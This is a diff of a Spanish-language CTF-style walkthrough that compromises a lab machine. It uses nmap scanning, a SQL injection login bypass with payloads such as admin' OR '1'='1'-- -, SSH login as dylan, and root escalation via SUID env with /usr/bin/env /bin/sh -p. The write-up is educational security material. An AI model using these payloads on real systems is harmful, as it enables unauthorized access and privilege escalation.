@@ -2,8 +2,7 @@
 Usamos `nmap` para detectar puertos abiertos y versiones de servicios:
 
 ```bash
-sudo nmap <IP_DEL_OBJETIVO>
-nmap -sV -p 22,80 <IP_DEL_OBJETIVO>
+nmap -sV -O <IP_DEL_OBJETIVO>
 ```
 
 Servicios Identificados:
@@ -13,7 +12,8 @@ Servicios Identificados:
 | 22/tcp | ssh      | OpenSSH 8.9p1       |
 | 80/tcp | http     | Apache httpd 2.4.52 |
 
-Esto nos indica que hay un servidor SSH y una aplicación web Apache, siendo esta última el probable punto de entrada para la inyección.
+Detectamos un servidor web Apache en el puerto 80, el cual será nuestro principal vector de ataque
+
 ## 2. Explotación: Inyección SQL
 
 Accedemos a la aplicación web en el puerto 80, que presenta un formulario de inicio de sesión.
@@ -31,34 +31,41 @@ SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in you
 
 ### 2.2. Bypass de Autenticación
 
-Con la vulnerabilidad confirmada, podemos usar un payload para saltar la autenticación. El payload `‘ OR ‘1’=’1` manipula la consulta SQL para que siempre sea verdadera.
+Aprovechamos la vulnerabilidad para manipular la lógica de la consulta SQL y acceder sin credenciales válidas. Nuestro objetivo es inyectar una condición que siempre se evalúe como verdadera (`OR 1=1`).
 
-*   **Usuario:** `cualquier cosa`
-*   **Contraseña:** ‘ OR ‘1’=’1
+**Payload Exitoso:**
 
-Tambien funciona:
+- **Usuario:** `admin' OR '1'='1'-- -`
+- **Contraseña:** `(cualquier cosa)`
 
-User:' OR '1'='1'-- Pasword: cualquier cosa
-User:' OR '1'='1'# Pasword: cualquier cosa
-User:admin’ or 1=1— - Pasword: cualquier cosa
+**Análisis Técnico:** La consulta en el backend probablemente se asemeja a:
 
-**Cómo funciona:**
-La consulta original (ej. `SELECT * FROM users WHERE username = 'user' AND password = 'pass';`) se transforma en:
-
-```sql
-SELECT * FROM users WHERE username = 'cualquier cosa' AND password = '' OR '1'='1';
+```SQL
+SELECT * FROM users WHERE username = '$user' AND password = '$pass';
 ```
 
-Dado que `‘1’='1'` es siempre verdadero, la condición `OR` hace que toda la cláusula `WHERE` sea verdadera, permitiendo el acceso. Otras variaciones como `‘ OR ‘1’='1'--` o `admin’ or 1=1— -` también funcionan.
+Al inyectar nuestro payload, la consulta resultante se interpreta así:
+
+```SQL
+SELECT * FROM users WHERE username = 'admin' OR '1'='1'-- -' AND password = '...';
+```
+
+- `admin`: Seleccionamos al usuario administrador.
+- `' OR '1'='1`: Condición tautológica (siempre verdadera).
+- `-- -`: Comentario de SQL que anula el resto de la consulta (la verificación de contraseña original).
+
+Esto nos permite acceder al panel de administración, donde identificamos las credenciales o claves de acceso para el usuario **dylan**.
+
 ## 3. Acceso Inicial vía SSH
 
-Una vez obtenido un nombre de usuario (ej. "Dylan") a través del bypass de autenticación, intentamos acceder al sistema vía SSH:
+Una vez obtenido un nombre de usuario (ej. "Dylan") a través del bypass de autenticación, accedemos al sistema vía SSH:
 
 ```bash
 ssh dylan@< IP_DEL_OBJETIVO >
 ```
 
-El comando `whoami` confirmará el usuario actual.
+El comando `whoami` confirma el usuario `dylan`.
+
 ## 4. Escalada de Privilegios
 El objetivo es obtener privilegios de `root` buscando configuraciones erróneas.
 ### 4.1. Búsqueda de Binarios SUID
@@ -76,7 +83,7 @@ find / -perm -4000 -user root 2>/dev/null
 /usr/bin/mount 
 /usr/bin/gpasswd 
 /usr/bin/chfn 
-/usr/bin/env ← 
+/usr/bin/env   ← Vulnerable 
 /usr/bin/su
 /usr/bin/newgrp 
 /usr/bin/chsh
@@ -84,14 +91,20 @@ find / -perm -4000 -user root 2>/dev/null
 /usr/bin/passwd
 ```
 Un binario común para explotar es `/usr/bin/env`.
+
 ### 4.2. Explotación de `env` (GTFOBins)
 
-Consultamos [GTFOBins](https://gtfobins.github.io/) para encontrar cómo explotar `env`. La técnica es ejecutar `env` con un shell y el flag `-p` para mantener los privilegios de `root`:
+Consultamos [GTFOBins](https://www.google.com/search?q=https://gtfobins.github.io/gtfobins/env/%23suid) y confirmamos que `env` permite romper el entorno restringido si tiene permisos SUID.
 
-```bash
+**Comando de Explotación:** Ejecutamos `env` invocando una shell de sistema (`/bin/sh`) con el flag `-p` para preservar los privilegios efectivos (EUID).
+
+```Bash
 /usr/bin/env /bin/sh -p
 ```
 
-El flag `-p` asegura que el shell (`/bin/sh`) se ejecute con los permisos del propietario de `env` (que es `root`).
+**Verificación:**
 
-`whoami` muestra `root`.
+```Bash
+whoami
+# root
+```
